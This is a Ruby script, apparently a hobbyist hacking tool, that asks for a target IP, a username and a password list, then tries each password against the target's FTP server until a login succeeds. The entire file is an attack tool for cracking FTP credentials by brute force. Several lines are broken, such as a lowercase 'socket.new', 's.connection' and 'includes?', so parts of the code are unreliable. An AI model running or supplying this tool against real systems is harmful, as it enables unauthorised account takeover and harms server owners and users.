require 'socket'
require 'timeout'
require 'colorize'

class String
def black;          "\e[30m#{self}\e[0m" end
def red;            "\e[31m#{self}\e[0m" end
def green;          "\e[32m#{self}\e[0m" end
def brown;          "\e[33m#{self}\e[0m" end
def blue;           "\e[34m#{self}\e[0m" end
def magenta;        "\e[35m#{self}\e[0m" end
def cyan;           "\e[36m#{self}\e[0m" end
def gray;           "\e[37m#{self}\e[0m" end

def bg_black;       "\e[40m#{self}\e[0m" end
def bg_red;         "\e[41m#{self}\e[0m" end
def bg_green;       "\e[42m#{self}\e[0m" end
def bg_brown;       "\e[43m#{self}\e[0m" end
def bg_blue;        "\e[44m#{self}\e[0m" end
def bg_magenta;     "\e[45m#{self}\e[0m" end
def bg_cyan;        "\e[46m#{self}\e[0m" end
def bg_gray;        "\e[47m#{self}\e[0m" end

def bold;           "\e[1m#{self}\e[22m" end
def italic;         "\e[3m#{self}\e[23m" end
def underline;      "\e[4m#{self}\e[24m" end
def blink;          "\e[5m#{self}\e[25m" end
def reverse_color;  "\e[7m#{self}\e[27m" end
end



puts """

   
                     ___________
                    (===========) ______________
                    |  ||  ||   ||~~~~~~~~~~~~~~|
                    |  ||  ||   ||        (@)   |
                    |  ||  ||   ||        //    |
                    |  ||  ||   ||       //     |
                    |  ||  ||   ||(@)===(o)     |
                    |  ||  ||   ||        ''    |
                    |           ||         ''   |
                    |~~~~~~~~~~~||         (@)  |
                    |___________||              |
                    (___________)|              |
                     (_________) |    @--(o)    |
                       |     |   (              (
                       |     |          (o)     
                       |     |          /        
                       |     |         @          
                       |_____|                     
                       |_____|                     
                       '_____/                       
                         |/|                          
                      )  |/|                           
                     (  ,|/|  / '                       
                      '  |/| ( '                         
                _____  ) |/|' )         _                 
          |    |     |___|/|___________| |                
          |====|     |_________________| |                  
         =|   _|      |_______________|  |                   
             |                           |                    
        _____|___________________________|_______)______________)
       |                                                        |
       |                                                        |
       |________________________________________________________|

""".light_blue

print "Input Target IP: ".bold.blue
$rhost = gets.chomp
print "Input Username: ".bold.cyan
$username = gets.chomp
print "Input Password List: ".bold.magenta
$wordlist = gets.chomp



def checkTarget()
		print '[*] Checking Target... '.italic
		begin
			s = socket.new Socket::AF_INET, Socket::SOCK_STREAM
			sockaddr = Socket.pack_sockaddr_in( 21, $rhost )
			timeout(5) do
					@result = s.connection(sockaddr)
			end
			s.close
if @result == 0
		puts 'Connection Established'
	else
	puts 'Connection Refused'.bold.bg_red.black
	end
rescue
		puts 'FAIL'.bold.bg_red.black
		exit
	end
end

def getWordlist(path)
		print '[*]Reading Wordlist...'.yellow
		begin
				file = File.open(path, 'r')
				$to_check = file.read.chomp.split("\n")
				file.close
				puts 'Done'.bold.bg_green.white
			rescue
				puts 'Fail'.bold.bg_red.black
				exit
		end
end
 
def crackPass(pass)
		begin
				s = TCPSocket.new($rhost, 21)
				s.gets
				s.puts("USER #{$username}")
				s.gets
				s.puts("PASS #{pass}")
				data = s.gets
				s.close
				return false unless data.includes? '230'
				return true
		rescue
				return false
		end
end

checkTarget()
getWordlist($wordlist)

puts "[*]Cracking FTP Password for #{$username} at #{$rhost}...\n\n"

$to_check.each do |pass|
		if crackPass(pass)
				puts "[*] Credentials Found".bg_green.white 
				puts "\tUsername: #{$username}".underline.bold.cyan
				puts "\tPassword: #{pass}\n\n".underline.bold.cyan
				break
		end
end

puts '[*]Cracking Complete'.green